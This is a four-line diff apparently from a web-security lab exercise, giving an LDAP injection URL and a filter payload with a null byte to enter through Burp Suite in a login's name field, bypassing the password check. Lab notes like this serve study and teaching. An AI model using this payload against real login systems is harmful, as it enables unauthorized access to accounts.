@@ -1,0 +1,4 @@
+http://[yourlab]/ldap/example2.php?name=hacker)(cn=*))%00&password=asdfasdf
+Using burpsuit inject:
+	(&(cn=hacker)(cn=*))%00)
+in the name field
